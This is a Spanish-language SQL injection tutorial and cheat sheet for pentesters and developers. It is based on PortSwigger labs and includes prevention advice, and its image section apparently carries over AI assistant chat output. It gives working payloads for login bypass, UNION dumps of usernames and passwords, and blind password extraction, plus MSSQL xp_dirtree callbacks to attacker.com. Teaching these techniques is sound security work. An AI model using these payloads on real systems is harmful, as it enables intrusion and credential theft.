# Guía completa: SQL Injection (Inyección SQL)

> Documento técnico y práctico (en español) pensado para pentesters, desarrolladores y equipos de seguridad. Profundiza en detección, explotación (incluido UNION y blind SQLi), y mitigación. Basado en ejercicios y labs como los de PortSwigger.

---

## Índice

1. [Introducción y conceptos básicos](#introducción-y-conceptos-básicos)
2. [SQL Injection — Examinando la base de datos](#sql-injection--examinando-la-base-de-datos)

   * *Querying the type and version*
   * *Listing the contents*
   * *Detecting SQL injection vulnerabilities* (en distintas partes y contextos)
3. [SQL Injection — ataques UNION (`UNION` / `UNION ALL`)](#sql-injection--union-attacks)

   * Determinar número de columnas
   * Encontrar columnas con tipos útiles
   * Recuperar datos interesantes
   * Recuperar múltiples valores en una sola columna
4. [Blind SQL Injection](#blind-sql-injection)

   * ¿Qué es blind SQLi?
   * Respuestas condicionales (boolean-based)
   * Error-based SQLi
   * Time-based (delays)
   * Out-of-band (OAST)
5. [Cómo prevenir SQL Injection (incluyendo prevención de blind SQLi)](#cómo-prevenir-sql-injection)
6. [Cheat sheet (resumen rápido) — basado en labs de PortSwigger](#cheat-sheet)
7. [Imágenes y diagramas sugeridos](#imágenes-y-diagramas-sugeridos)
8. [Referencias y lecturas recomendadas]

---

## Introducción y conceptos básicos

**SQL Injection (SQLi)** es una vulnerabilidad que ocurre cuando una aplicación construye consultas SQL con entrada del usuario sin validarla o parametrizar correctamente. El atacante inyecta fragmentos de SQL para alterar la consulta original y obtener información, modificar datos o ejecutar comandos no previstos.

Tipos comunes:

* **In-band (classical):** los datos se obtienen por la misma vía (ej. UNION, error-based).
* **Blind (ciegas):** la aplicación no devuelve datos directamente — inferencia mediante respuestas booleanas o tiempos.
* **Out-of-band (OAST):** se usan canales externos (DNS, HTTP callbacks) para extraer datos.

Importante: hay diferencias entre motores (MySQL, PostgreSQL, MSSQL, Oracle) — sintaxis de funciones, comentarios, delay functions, y meta-tablas (e.g., `information_schema`, `sysobjects`).

---

## SQL Injection — Examinando la base de datos

### 1) *Querying the type and version* (¿qué motor y versión?)

Saber el motor ayuda a elegir payloads correctos (funciones, concatenación, sleep, comentarios).

**Payloads típicos** (inserta en un parámetro vulnerable como `id`):

* MySQL version: `1' AND @@version LIKE '%5.%' -- `
* Generic version extraction: `' UNION SELECT @@version-- `
* PostgreSQL: `' UNION SELECT version()-- `
* MSSQL: `' UNION SELECT @@version-- `

Si la aplicación retorna la versión, ya sabes muchas funciones disponibles.

### 2) *Listing the contents* (tablas/columnas útiles)

En MySQL:

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

En PostgreSQL las tablas del catálogo son `pg_catalog` o `information_schema`.

**Payload de enumeración (ejemplo MySQL):**

```
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
```

Para enumerar columnas de una tabla concreta:

```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### 3) *Detecting SQL injection vulnerabilities* — en distintas partes y contextos

**Lugares comunes para inyectar:**

* Parámetros GET/POST (e.g. `?id=1`)
* Cabeceras HTTP (User-Agent, Referer)
* Cookies
* Campos de formularios (búsqueda, filtro, login, creación de cuenta)
* Valores usados en cláusulas `ORDER BY`, `LIMIT`, `FROM`, `JOIN`, `GROUP BY`

**Técnicas de detección:**

* Inyectar comillas: `1'` o `"` y observar errores o comportamiento.
* Pruebas booleanas: `1' AND 1=1 --` vs `1' AND 1=2 --`.
* Probar comentarios: `--`, `#` (MySQL), `/* ... */`.
* Probar `UNION SELECT` para forzar una unión que muestre resultados.

**Contextos especiales:**

* Dentro de una cadena literal: `'... user input ...'` → usar `' OR '1'='1` o cerrar la comilla.
* Dentro de números: no usar comillas, por eso `1 OR 1=1`.
* Dentro de `LIKE`: usar `' OR 'a' LIKE 'a`.
* En `ORDER BY`: usar `ORDER BY 1,2,3` para detectar columnas.

---

## SQL Injection — ataques `UNION`

`UNION` permite concatenar el resultado de otra consulta SELECT a la respuesta original. Requisitos y pasos:

### Paso 1: Determinar el número de columnas

Técnica: iterar `ORDER BY n` en la consulta original o usar `UNION SELECT` con n columnas de tipo `NULL` hasta no obtener error.

**Ejemplo (procedimiento):**

* Probar: `/product?id=1 ORDER BY 1--` → OK
* `/product?id=1 ORDER BY 2--` → OK
* `/product?id=1 ORDER BY 3--` → ERROR → entonces hay 2 columnas

O con `UNION`:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

El payload que no produce error sugiere el número correcto.

### Paso 2: Encontrar columnas con tipos útiles

Si la aplicación muestra una columna en la página, inyecta una cadena en cada posición: `UNION SELECT 'a', NULL, NULL` y ver cuál aparece.

**Consejo:** usar funciones de conversión o casting si el motor lo requiere (`CAST(... AS CHAR)`).

### Paso 3: Recuperar datos

Una vez identificadas columnas visibles, reemplazar `'a'` por una subconsulta que lea de `users`:

```
' UNION SELECT username, password FROM users--
```

Si hay más columnas de las esperadas, rellena con `NULL` o con valores convertidos: `UNION SELECT username, NULL, password--`.

### Paso 4: Recuperar múltiples valores en una sola columna

Si sólo puedes inyectar una columna visible, concatenar múltiples campos en una única cadena:

MySQL:

```
UNION SELECT CONCAT(username, ':', password) FROM users--
```

PostgreSQL:

```
UNION SELECT username || ':' || password FROM users--
```

O usar agregaciones: `GROUP_CONCAT`, `string_agg`:

```
UNION SELECT GROUP_CONCAT(username,':',password) FROM users--
```

### Notas sobre columnas y tipos

* Si la aplicación espera un número, `UNION` con `NULL` o un `0` puede funcionar.
* Para columnas `TEXT`/`VARCHAR` usar `CONCAT` o funciones de conversión.

---

## Blind SQL Injection

### ¿Qué es?

Cuando la aplicación NO devuelve datos SQL directamente (sin errores visibles ni UNIONs), pero sí refleja cambios en la respuesta según condiciones booleanas o temporales. El atacante infiere información bit a bit.

### 1) Respuestas condicionales (Boolean-based)

Principio: enviar consultas que evalúen a `TRUE` o `FALSE` y observar diferencias en la página (contenido, código HTTP, longitud, comportamiento de JavaScript).

**Ejemplo (boolean-based)**:

```
?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

Si la página cambia (por ejemplo muestra el producto correctamente sólo cuando la condición es verdadera), entonces sabemos que la primera letra de la contraseña es `a`.

Automatización: herramientas como `sqlmap` o BurpIntruder con payloads recursivos.

### 2) Error-based SQLi

Provocar errores que devuelvan datos en el mensaje de error. Ejemplo MySQL:

```
1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x) a)--
```

(Esto fuerza un error de agrupamiento que a veces revela datos en el mensaje).

Los errores dependen del nivel de debug de la aplicación y del motor.

### 3) Time-based (delays)

Cuando no hay diferencias visibles en contenido, medir tiempo de respuesta.

**MySQL:** `SLEEP(5)`

```
?id=1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
```

Si la respuesta tarda ~5s, la condición es verdadera.

**PostgreSQL:** `pg_sleep(5)`
**MSSQL:** `WAITFOR DELAY '0:0:5'`

### 4) Out-of-band (OAST)

Usar funciones del motor que provoquen solicitudes HTTP/DNS a un servidor controlado por el atacante para exfiltrar datos.

* MySQL `LOAD_FILE()` no hace callbacks, pero en algunos motores o extensiones puedes usar funciones que llamen a la red.
* Usar `xp_dirtree`/`xp_fileexist` en MSSQL combinado con UNC paths (`\attacker.com\share\`) para generar DNS lookups.

Requiere que el servidor de base de datos pueda resolver nombres y que exista un canal de red para las peticiones salientes.

---

## Cómo prevenir SQL Injection & prevenir blind SQLi

### Buenas prácticas (en orden de prioridad):

1. **Consultas parametrizadas / Prepared Statements (bind parameters).**

   * Ejemplo en PHP (PDO):

     ```php
     $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
     $stmt->execute([$id]);
     ```
2. **ORMs** que generen consultas parametrizadas automáticamente (aunque no son garantía si usas `raw` queries).
3. **Validación y normalización de entrada.** Whitelisting (tipos, longitudes, rangos) antes de usar datos en SQL.
4. **Escapar correctamente** cuando no hay prepared statements (evitar esto si es posible). Use las funciones específicas del driver.
5. **Principio de mínimo privilegio:** la cuenta de BD usada por la web debe tener sólo los permisos necesarios (no `DROP`, no `ALTER`, etc.).
6. **Evitar mensajes de error detallados en producción.** No exponer stack traces ni mensajes SQL al usuario.
7. **Uso de WAF** como defensa en profundidad — no lo uses como única defensa.
8. **Registro y monitorización** de consultas anómalas, alertas por patrones de inyección.
9. **Cifrado de datos sensibles** en reposo y en tránsito; proteger credenciales con hashing (bcrypt/argon2 para passwords).

### Prevenir Blind SQLi específicamente

* Las medidas anteriores mitigan blind SQLi (parametrización/escapado).
* Evita mostrar diferencias pequeñas entre respuestas que permitan inferencia (por ejemplo, no devolver contenido distinto ante errores o condiciones internas).
* Limitar tiempos máximos de respuesta y proteger la función `SLEEP` del motor si es posible (no siempre aplicable).

---

## Cheat sheet (resumen rápido) — basado en labs de PortSwigger

> Nota: ajustar payloads según motor (MySQL/Postgres/MSSQL/Oracle) y contexto (cadena vs número). Evita usar estos comandos en sistemas sin autorización.

### Comentarios según motor

* MySQL: `-- ` o `#` (nota: `-- ` requiere espacio después)
* MSSQL/Oracle: `--`
* Multi-line: `/* ... */`

### Cerrar comillas y pruebas básicas

* `1' OR '1'='1'-- ` — autenticación bypass básica
* `' OR 'x'='x` — boolean test

### Detectar número de columnas

* `ORDER BY 1--`, `ORDER BY 2--`, ...
* `UNION SELECT NULL--`, `UNION SELECT NULL,NULL--`, ...

### UNION payloads (MySQL example)

* `-1' UNION SELECT null,version()-- `
* `-1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- `

### Extraer usuarios/contraseñas

* `-1' UNION SELECT null, CONCAT(username,0x3a,password) FROM users-- `

### Boolean based (blind)

* `1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- `
* `1' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 109-- `

### Time based

* MySQL: `1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)-- `
* PostgreSQL: `1' AND (SELECT CASE WHEN (substring((SELECT password FROM users LIMIT 1),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)-- `

### Error based

* Forzar error con `CAST` o `CONCAT` y funciones de agrupamiento para revelar dato en mensaje de error.

### OAST examples

* For MSSQL: `'; exec master..xp_dirtree '\\attacker.com\share'-- ` (genera petición DNS/SMB hacia attacker.com)

---

## Imágenes y diagramas sugeridos

A continuación se listan imágenes/diagramas útiles que ilustran los conceptos del documento. Puedes usar imágenes similares a las de PortSwigger o las que ya tienes en tu entorno. Las imágenes suelen mostrar:

1. **Flujo de ataque básico**: input → parámetro vulnerable → DB → datos exfiltrados (ej. `UNION SELECT username, password`).
2. **UNION attack diagram**: determinar columnas → rellenar con NULLs → mostrar columnas visibles.
3. **Blind SQLi timing**: petición normal vs petición con `SLEEP(5)` — medir retraso.
4. **OAST diagram**: DB hace callback DNS/HTTP a servidor atacante.

Si deseas, puedo añadir y/o generar diagramas específicos (por ejemplo: uno que muestre `ORDER BY` → errores; otro que muestre `UNION` con columnas), o incorporar las imágenes que subiste. Las imágenes que has subido en esta conversación (por ejemplo `7535eadc-0f3f-4868-bda4-ad6d8b9e3098.png` y `bfbf874a-0386-453b-9c15-8f5657409612.png`) son perfectamente adecuadas para los apartados:

* `7535eadc-0f3f-4868-bda4-ad6d8b9e3098.png`: buen diagrama conceptual de flujo de inyección.
* `bfbf874a-0386-453b-9c15-8f5657409612.png`: buen diagrama para ilustrar exfiltración y UNION.

> Indica si quieres que inserte estas imágenes en el documento (y en qué secciones) o si deseas nuevas imágenes generadas (p.ej. vectores explicativos, payloads resaltados, diagramas paso a paso). Puedo generar imágenes didácticas a partir de los diagramas existentes.

---

## Referencias y lecturas recomendadas

* PortSwigger Web Security Academy — labs y guías de SQL Injection. (Recomendado: realizar labs prácticos).
* OWASP Top 10 (Inyección SQL, A1 / A03 según versiones).
* Documentación de cada motor (MySQL docs, PostgreSQL docs, Microsoft SQL Server docs).

---

## Aviso legal y ético

Las técnicas descritas son para **fines educativos, auditoría autorizada y pruebas de seguridad**. No uses estas técnicas contra sistemas sin permiso expreso. El uso malicioso es ilegal.

---

*Fin del documento.*
